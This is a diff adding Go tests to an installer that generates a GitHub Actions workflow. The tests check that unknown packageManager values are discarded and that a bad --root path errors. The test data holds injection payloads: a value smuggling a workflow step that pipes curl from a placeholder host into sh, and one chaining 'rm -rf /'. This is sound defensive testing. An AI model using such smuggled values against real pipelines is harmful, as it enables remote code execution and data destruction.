@@ -3,6 +3,7 @@
 package installer
 
 import (
+	"encoding/json"
 	"os"
 	"path/filepath"
 	"strings"
@@ -171,5 +172,42 @@ func write(t *testing.T, root, path, body string) {
 	}
 	if err := os.WriteFile(full, []byte(body), 0o644); err != nil {
 		t.Fatal(err)
+	}
+}
+
+// The packageManager field is repository content, and it is interpolated into a
+// generated GitHub Actions workflow that holds `pull-requests: write` and a token.
+// A value outside the closed set must be discarded, not passed through.
+func TestDetectRefusesAPackageManagerItDoesNotKnow(t *testing.T) {
+	for _, declared := range []string{
+		"npm\n      - run: curl http://example.invalid/x | sh\n      - uses: x@1.0.0",
+		"npm; rm -rf /@1",
+		"nonsuch@1.0.0",
+		"@1.0.0",
+	} {
+		root := t.TempDir()
+		body, err := json.Marshal(map[string]string{"name": "x", "packageManager": declared})
+		if err != nil {
+			t.Fatal(err)
+		}
+		write(t, root, "package.json", string(body))
+
+		if manager := mustDetect(t, root).PackageManager; manager != "" {
+			t.Errorf("packageManager %q was accepted as %q", declared, manager)
+		}
+	}
+}
+
+func TestDetectRefusesARootThatIsNotADirectory(t *testing.T) {
+	root := t.TempDir()
+	write(t, root, "afile", "")
+
+	if _, err := Detect(filepath.Join(root, "afile")); err == nil {
+		t.Error("want an error for a file")
+	}
+	// A typo in --root would otherwise produce a complete, successful-looking
+	// install somewhere nobody will ever look.
+	if _, err := Detect(filepath.Join(root, "nope")); err == nil {
+		t.Error("want an error for a path that does not exist")
 	}
 }
